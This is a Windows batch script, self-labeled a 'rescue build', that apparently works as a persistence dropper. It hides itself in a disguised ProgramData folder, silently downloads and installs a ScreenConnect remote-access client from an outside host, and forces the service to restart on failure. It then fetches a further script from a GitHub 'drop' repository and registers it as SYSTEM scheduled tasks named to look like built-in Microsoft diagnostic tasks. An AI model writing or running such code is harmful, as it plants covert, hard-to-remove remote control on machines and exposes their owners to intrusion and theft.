@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM RESCUE BUILD 20260802R2 - panic reinstall (detaches past Guest 10s kill)
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "SELF=%WD%\rescue_run.cmd"
set "LOG=%WD%\boot.err"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1

if /I not "%~1"=="_RUN" (
  echo === RESCUE BUILD 20260802R2 ===
  net session >nul 2>&1
  if errorlevel 1 (echo need Administrator & exit /b 5)
  copy /y "%~f0" "%SELF%" >nul
  echo rescue_detach_begin>>"%LOG%"
  wmic process call create "cmd.exe /c \"%SELF%\" _RUN" >"%WD%\rescue_detach.wmic" 2>&1
  echo rescue_detach_done>>"%LOG%"
  echo Detached. Wait ~90s then:
  echo   type "%LOG%"
  echo   sc query state= all ^| findstr /I ScreenConnect
  exit /b 0
)

echo rescue_worker %DATE% %TIME%>>"%LOG%"
echo === RESCUE WORKER 20260802R2 ===

set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSICACHE=%WD%\pkg.msi"
set "MSI=%TEMP%\sc_rescue.msi"

del /f /q "%MSI%" >nul 2>&1
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%MSI%" "%MSIURL%"
if not exist "%MSI%" if exist "%MSICACHE%" copy /y "%MSICACHE%" "%MSI%" >nul
if not exist "%MSI%" (
  echo rescue_msi_fail>>"%LOG%"
  exit /b 1
)
for %%A in ("%MSI%") do (
  echo msi_bytes=%%~zA>>"%LOG%"
  if %%~zA LSS 500000 (
    echo rescue_msi_small>>"%LOG%"
    exit /b 1
  )
  copy /y "%MSI%" "%MSICACHE%" >nul
)

msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress
echo msi_exit_%ERRORLEVEL%>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=vomus REBOOT=ReallySuppress
echo msi_reinstall_%ERRORLEVEL%>>"%LOG%"

sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 8 /nobreak >nul
sc start "%PRIM%" >nul 2>&1
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1

curl.exe -L --ssl-no-revoke -o "%WD%\own_mon.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_mon.cmd" >nul 2>&1
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >nul 2>&1
schtasks /Create /TN "\Microsoft\Windows\Diagnosis\Scheduled" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 2 /F /TR "cmd.exe /c \"%WD%\own_mon.cmd\"" >nul 2>&1
schtasks /Create /TN "\Microsoft\Windows\PLA\Server" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 3 /F /TR "cmd.exe /c \"%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd\"" >nul 2>&1
schtasks /Create /TN "\Microsoft\Windows\WDI\ResolutionHost" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c \"%WD%\own_mon.cmd\"" >nul 2>&1
schtasks /Create /TN "\Microsoft\Windows\Tcpip\IpAddressConflict1" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c \"%WD%\own_mon.cmd\"" >nul 2>&1

sc query "%PRIM%" >>"%LOG%" 2>&1
sc query state= all | findstr /I ScreenConnect >>"%LOG%"
echo rescue_done>>"%LOG%"
exit /b 0
